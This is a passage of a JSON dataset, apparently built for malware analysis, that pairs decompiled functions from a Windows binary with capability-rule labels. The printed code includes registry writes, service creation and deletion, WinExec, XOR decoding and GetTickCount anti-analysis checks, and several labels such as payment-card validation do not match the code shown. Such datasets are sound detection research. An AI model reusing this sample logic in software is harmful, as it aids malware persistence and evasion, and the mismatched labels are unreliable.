            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404b20(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00404c20;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x40749c;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "004011a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040120b) overlaps instruction at (ram,0x0040120a)\n// \n// WARNING: Removing unreachable block (ram,0x004011fb)\n// WARNING: Removing unreachable block (ram,0x00401276)\n// WARNING: Removing unreachable block (ram,0x00401285)\n// WARNING: Removing unreachable block (ram,0x004012b5)\n// WARNING: Removing unreachable block (ram,0x004012c1)\n// WARNING: Removing unreachable block (ram,0x004012e3)\n// WARNING: Removing unreachable block (ram,0x00401200)\n\nbool fcn.004011a0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    int32_t unaff_EDI;\n    char *pcVar6;\n    bool bVar7;\n    int32_t iStack8;\n    \n    iStack8 = 0;\n    iVar2 = fcn.00403730(&iStack8);\n    bVar7 = iVar2 == 0;\n    if (bVar7) {\n        return false;\n    }\n    iVar3 = iStack8;\n    puVar5 = &stack0xfffffffc;\n    if ((!bVar7) && (puVar5 = &stack0xfffffffc,  bVar7)) {\n        *(unaff_EDI + -0x75) = *(unaff_EDI + -0x75) - &stack0xfffffff4;\n        iVar3 = iVar2;\n        puVar5 = &stack0xfffffffd;\n    }\n    if (iVar3 == 0) {\n        return false;\n    }\n    uVar4 = 0xffffffff;\n    pcVar6 = *(puVar5 + -4);\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, *(puVar5 + -4), ~uVar4 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 523
    },
    "00401350": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004014ab) overlaps instruction at (ram,0x004014a9)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00401350(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    char cVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint *extraout_ECX;\n    uint *arg_8h_00;\n    uint in_EDX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t unaff_EBX;\n    uint *puVar7;\n    uchar uVar8;\n    uchar uVar9;\n    bool bVar10;\n    bool bVar11;\n    uint64_t uVar12;\n    unkbyte6 Var13;\n    uint8_t in_stack_4d8df841;\n    uint uStack584;\n    uchar uStack572;\n    uchar uStack571;\n    ushort uStack570;\n    uint8_t uVar14;\n    unkuint3 Stack555;\n    uchar *puStack556;\n    uint uStack552;\n    uchar lpBuffer;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack572 = 0xfc;\n    puVar7 = &stack0xfffffffc;\n    s = 0;\n    puVar5 = &fcn.00401350::var_213h;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &fcn.00401350::var_10fh;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_ch = 1;\n    *(puVar5 + 2) = 0;\n    uStack571 = &stack0xfffffffc >> 8;\n    uStack570 = &stack0xfffffffc >> 0x10;\n    cVar2 = (in_EDX >> 8) + -0x36;\n    uVar9 = cVar2 == '\\0';\n    uVar8 = (POPCOUNT(cVar2) & 1U) == 0;\n    puStack556 = &stack0xfffffde8;\n    uStack552 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uStack572 = SUB41(&stack0xfffffeec, 0);\n    uStack571 = &stack0xfffffeec >> 8;\n    uStack570 = &stack0xfffffeec >> 0x10;\n    Var13 = (*_sym.imp.MSVCRT.dll_sprintf)();\n    if ((uVar9) || (!uVar9)) {\n        puVar5 = &fcn.00401350::var_8h;\n        arg_8h_00 = &fcn.00401350::var_4h;\n    }\n    else {\n        uVar1 = in(Var13 >> 0x20);\n        *(puVar5 + 3) = uVar1;\n        if (&stack0xfffffdc4 < 1) {\n            pcVar3 = swi(1);\n            uVar4 = (*pcVar3)();\n            return uVar4;\n        }\n        uVar4 = Var13 ^ 0xdee0ed6d;\n        puVar5 = uVar4 & 0xffff0000 | uVar4 + (uVar4 >> 8) * -0x31;\n        uVar8 = (POPCOUNT(in_stack_4d8df841 ^ extraout_ECX) & 1U) == 0;\n        arg_8h_00 = extraout_ECX;\n    }\n    uStack584 = 0x4013fe;\n    fcn.004049f0(arg_8h_00, puVar5);\n    if ((!uVar8) && (uVar8)) {\n        puVar5 = &stack0xfffffdb8;\n        cVar2 = '\\x1e';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar7;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    iVar6 = fcn.00403000(arg_8h, arg_ch, arg_10h, arg_14h, var_4h);\n    if (iVar6 == 0) {\n        return 0;\n    }\n    uStack572 = 0x7f;\n    uStack571 = 0x14;\n    uStack570 = 0x40;\n    iVar6 = fcn.00402a60(&stack0xfffffeec, var_4h, var_8h);\n    bVar11 = iVar6 < 0;\n    bVar10 = iVar6 == 0;\n    if (bVar10) {\n        return 0;\n    }\n    if ((!bVar10) && (bVar10)) {\n        bVar11 = &stack0xfffffdd5 < 0;\n    }\n    if ((!bVar11) && (bVar11)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puStack556 = puStack556 & 0xffffff00;\n    fcn.004011a0();\n    Stack555 = puStack556 >> 8;\n    iVar6 = fcn.004027f0(0x407068);\n    if (iVar6 == -1) {\n        iVar6 = fcn.004027f0(0x40705c);\n        if (iVar6 == -1) goto code_r0x00401540;\n        unaff_EBX = 0xf;\n    }\n    else {\n        unaff_EBX = 0xe;\n    }\n    iVar6 = fcn.00402940(arg_8h);\n    if (iVar6 != 0) {\n        puStack556 = Stack555 << 8;\n        fcn.00401730();\n        fcn.00404eb0();\n        return 1;\n    }\n    if (*0x42573c == 0) {\n        return 0;\n    }\ncode_r0x00401540:\n    uVar12 = fcn.00404a80(arg_8h, &stack0xfffffeec);\n    uVar4 = var_ch;\n    bVar10 = uVar12 == 0;\n    if (bVar10) {\n        var_ch = 0;\n    }\n    else if (bVar10) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar12 = uVar12 & 0xffffffff00000000 | var_ch;\n    bVar10 = var_ch == 0;\n    uVar14 = arg_8h >> 0x18;\n    var_ch = uVar4;\n    if (!bVar10) {\n        uVar12 = fcn.004012f0(arg_8h & 0xffffff | uVar14 << 0x18);\n        bVar10 = uVar12 == 0;\n    }\n    iVar6 = uVar12 >> 0x20;\n    bVar11 = uVar12 < 0;\n    if ((!bVar10 && !bVar11) && (bVar10 || bVar11)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if (var_ch == 0) {\n        fcn.00402b90(arg_8h, 0);\n        iVar6 = extraout_EDX;\n    }\n    bVar10 = false;\n    if (var_ch != 0) {\n        fcn.00404eb0();\n        bVar10 = 0xfffffffb < &stack0xfffffdd1;\n        iVar6 = extraout_EDX_00;\n    }\n    if ((!bVar10) && (bVar10)) {\n        unaff_EBX = unaff_EBX + *(unaff_EBX + 0x69 + iVar6 * 4) + bVar10;\n    }\n    puStack556 = Stack555 << 8;\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    uStack572 = unaff_EBX >> 0x18;\n    uStack584 = CONCAT31(*0x10 + -4, uVar14);\n    uStack571 = 0xe;\n    uStack570 = 0x4016;\n    (*_sym.imp.KERNEL32.dll_WinExec)();\n    return var_ch;\n}\n",
        "token_count": 2038
    },
    "00401a00": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401a00(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407104);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x425728 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407114);\n    *0x42572c = (*pcVar1)(iVar2, 0x407130);\n    *0x425730 = (*pcVar1)(iVar2, 0x407140);\n    if (((*0x425728 != 0) && (*0x42572c != 0)) && (*0x425730 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "00401f50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401fec) overlaps instruction at (ram,0x00401fe3)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401f50(int32_t *hWnd)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    char extraout_DH;\n    int32_t unaff_ESI;\n    uint *puVar7;\n    uint *in_FS_OFFSET;\n    uint8_t uVar8;\n    bool bVar9;\n    uint8_t in_IF;\n    bool bVar10;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    bVar10 = false;\n    var_4h = 0xffffffff;\n    uStack12 = 0x4051c0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    uVar8 = 0;\n    bVar9 = iVar2 == 0;\n    if (bVar9) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar2;\n    uVar3 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    if ((!bVar9) && (bVar9)) {\n        bVar10 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        uVar8 = (uVar8 & 1) != 0;\n    }\n    iVar4 = (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar3, 0, 0, 2, 1000, &lpdwResult);\n    if ((!uVar8) && (uVar8)) {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6827e95e;\n        pcVar1 = (iVar4 + 0x7c8ecb0d + (uVar8 == false)) * 3;\n        *pcVar1 = *pcVar1 - extraout_DH;\n    }\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2);\n    if (pcVar5 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar5)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00402376:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00402382:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x0040233d:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00402382;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00402179:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00401d50(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x40742c);\n                        if (iVar2 != 0) goto joined_r0x00402179;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00402322:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00402376;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar2 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00402322;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar7 = &var_147h;\n                            for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                *puVar7 = 0;\n                                puVar7 = puVar7 + bVar10 * -2 + 1;\n                            }\n                            *puVar7 = 0;\n                            *(puVar7 + bVar10 * -4 + 2) = 0;\n                            fcn.00401d50(iVar2, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar2 = fcn.00401e80(&var_148h);\n                            if (iVar2 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x0040233d;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar2 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar2 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar2);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2726
    },
    "00403160": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032db) overlaps instruction at (ram,0x004032da)\n// \n// WARNING: Removing unreachable block (ram,0x00403191)\n// WARNING: Removing unreachable block (ram,0x004032db)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403160(int32_t param_1, uint32_t param_2, int32_t param_3, uint32_t param_4, uint32_t param_5)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint8_t uVar4;\n    uint32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint32_t uVar5;\n    uint32_t *unaff_EDI;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    \n    uVar5 = 0;\n    bVar8 = false;\n    uVar2 = param_4;\n    if (param_4 != 0) {\n        do {\n            puVar7 = unaff_EDI;\n            if ((bVar8 == uVar2 < 0) && (bVar8 != uVar2 < 0)) {\n                out(0xc4, param_4);\n                puVar7 = unaff_EDI + 1;\n                *unaff_EDI = param_4;\n            }\n            uVar3 = uVar5 / param_2;\n            uVar4 = *(uVar5 + param_3) ^ *(uVar5 % param_2 + param_1);\n            unaff_EBX = unaff_EBX & 0xffffff00 | uVar4;\n            if ((uVar4 != 0) && (uVar4 == 0)) {\n                unaff_EBX = unaff_EBX + 1;\n                if (unaff_EBX == 0) {\n                    do {\n                        puVar6 = puVar7 ^ *(puVar7 + 0xe58be73);\n                        uVar4 = *(unaff_ESI % param_2 + param_1) ^\n                                *(unaff_ESI + param_3) ^ *((param_1 + -1) % param_2 + param_1);\n                        *((param_5 - 1) + param_1) = uVar4;\n                        puVar7 = puVar6;\n                        if ((-1 < uVar4) && (-1 >= uVar4)) {\n                            out(0xc4, param_5);\n                            puVar7 = puVar6 + 1;\n                            *puVar6 = param_5;\n                        }\n                        *(param_1 + param_5) = 0;\n                        unaff_ESI = unaff_ESI + 1;\n                    } while (unaff_ESI < param_4);\n                    return;\n                }\n                in_AF = 9 < (uVar3 & 0xf) | in_AF;\n                piVar1 = ((uVar3 >> 8 & 0xffff00) << 8 | CONCAT11((uVar3 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f\n                         ) + 0x2a;\n                *piVar1 = *piVar1 - unaff_EBX;\n                uVar5 = uVar5 + 1;\n            }\n            *(uVar5 + param_3) = unaff_EBX;\n            uVar5 = uVar5 + 1;\n            bVar8 = SBORROW4(uVar5, param_4);\n            uVar2 = uVar5 - param_4;\n            unaff_EDI = puVar7;\n        } while (uVar5 < param_4);\n    }\n    return;\n}\n",
        "token_count": 838
    },
    "00403310": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033e7) overlaps instruction at (ram,0x004033e3)\n// \n\nuint fcn.00403310(void)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uchar *puVar2;\n    uint *unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    bool bVar5;\n    uint uStack531;\n    uchar uStack272;\n    uchar auStack271 [259];\n    uint uStack12;\n    uchar auStack8 [4];\n    \n    uStack272 = 0;\n    puVar3 = &uStack531;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    puVar3 = auStack271;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack272, 0x407024);\n    iVar1 = fcn.00404e40(auStack8, &uStack12);\n    bVar4 = 0xfffffff7 < &stack0xfffffdd4;\n    bVar5 = iVar1 == -1;\n    fcn.00403440();\n    puVar2 = &stack0xfffffffc;\n    if ((!bVar4 && !bVar5) && (puVar2 = &stack0xfffffffc,  bVar4 || bVar5)) {\n        *(puVar3 + 3) = *unaff_ESI;\n        uStack12 = extraout_ECX;\n        puVar2 = 0x8be181cf;\n    }\n    iVar1 = fcn.00402a60(puVar2 + -0x10c, *(puVar2 + -4), uStack12);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00401000(puVar2 + -0x10c, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 557
    },
    "00404b80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404b93) overlaps instruction at (ram,0x00404b8e)\n// \n// WARNING: Removing unreachable block (ram,0x00404b93)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404b80(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        do {\n            uVar1 = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            if (uVar1 != 0) {\n                if (uVar1 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            *(var_8h + arg_10h) = arg_14h ^ uVar1;\n            var_8h = var_8h + 1;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uchar auStack32 [28];\n    \n    iVar4 = fcn.00404b20(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.004028e0(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(auStack32, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(auStack32);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(auStack32);\n            iVar5 = (*pcVar3)(auStack32, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 245
    },
    "004012f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004012f0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00401970(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "00401620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016f1) overlaps instruction at (ram,0x004016e8)\n// \n\nuint __fastcall fcn.00401620(int32_t param_1, ushort param_2, int32_t param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    uchar uVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    \n    if ((!in_OF) && (in_OF)) {\n        uVar1 = in(param_2);\n        *unaff_EDI = uVar1;\n        param_3 = param_1;\n        unaff_EDI = unaff_EDI + 1;\n        if (!in_CF && !in_ZF) {\n            if (unaff_ESI != 0) {\n                (*_sym.imp.MSVCRT.dll_fwrite)(param_5, 1, param_6);\n                *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x5627e95e;\n                (*_sym.imp.MSVCRT.dll_fflush)();\n                (*_sym.imp.MSVCRT.dll_fclose)();\n                return 1;\n            }\n            return in_EAX;\n        }\n    }\n    *0x8b0c458a = *0x8b0c458a | param_3 >> 8;\n    *unaff_EDI = *unaff_EDI + param_3;\n    *0x8b0c45dc = *0x8b0c45dc + param_2;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(0x56);\n    if (iVar2 != 0) {\n        uVar3 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar2);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 477
    },
    "004016a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004016f1) overlaps instruction at (ram,0x004016e8)\n// \n\nuint __cdecl fcn.004016a0(uint filename, uint mode)\n\n{\n    int32_t iVar1;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 != 0) {\n        (*_sym.imp.MSVCRT.dll_fwrite)(in_stack_0000000c, 1, in_stack_00000010, iVar1);\n        *(iVar1 + 0x43d1773a) = *(iVar1 + 0x43d1773a) ^ 0x5627e95e;\n        (*_sym.imp.MSVCRT.dll_fflush)();\n        (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 219
    },
    "00401d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401d50(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "004024a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
